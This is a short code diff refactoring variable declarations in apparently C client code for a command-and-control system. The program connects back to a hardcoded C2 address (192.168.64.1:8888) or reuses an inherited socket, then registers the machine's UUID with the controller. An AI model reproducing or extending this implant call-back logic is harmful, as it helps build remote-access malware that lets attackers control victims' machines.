@@ -35,12 +35,13 @@
 
 int connect_to(char *host, int port)
 {
-    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    int sockfd;
+    struct sockaddr_in hint;
 
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
     if (sockfd == -1)
         return -1;
 
-    struct sockaddr_in hint;
     hint.sin_family = AF_INET;
     hint.sin_port = htons(port);
     hint.sin_addr.s_addr = inet_addr(host);
@@ -53,12 +54,15 @@ int connect_to(char *host, int port)
 
 int main(int argc, char *argv[])
 {
-    c2_t *c2 = NULL;
+    c2_t *c2;
+    int c2_fd;
+    char uuid[UUID_SIZE];
+
+    c2 = NULL;
 
     if (strcmp(argv[0], "p") == 0)
     {
-        int c2_fd = (int)((long *)argv)[1];
-        char uuid[UUID_SIZE];
+        c2_fd = (int)((long *)argv)[1];
 
         if (machine_uuid(uuid) < 0)
             return 1;
@@ -66,9 +70,7 @@ int main(int argc, char *argv[])
         c2_add(&c2, 0, c2_fd, uuid);
     } else
     {
-        int c2_fd = connect_to("192.168.64.1", 8888);
-
-        char uuid[UUID_SIZE];
+        c2_fd = connect_to("192.168.64.1", 8888);
 
         if (machine_uuid(uuid) < 0)
             return 1;
